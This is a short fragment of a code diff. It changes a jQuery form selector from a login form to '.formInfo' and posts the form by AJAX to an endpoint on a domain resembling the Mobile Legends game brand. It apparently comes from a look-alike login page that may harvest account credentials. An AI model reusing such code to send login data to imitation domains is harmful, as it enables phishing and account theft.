@@ -1,5 +1,5 @@
-$(".login-form").submit(function() {
-    var d = $(".login-form");
+$(".formInfo").submit(function() {
+    var d = $(".formInfo");
 
     $.ajax({
         url: "https://api.mobilelegends-play.com/json/",
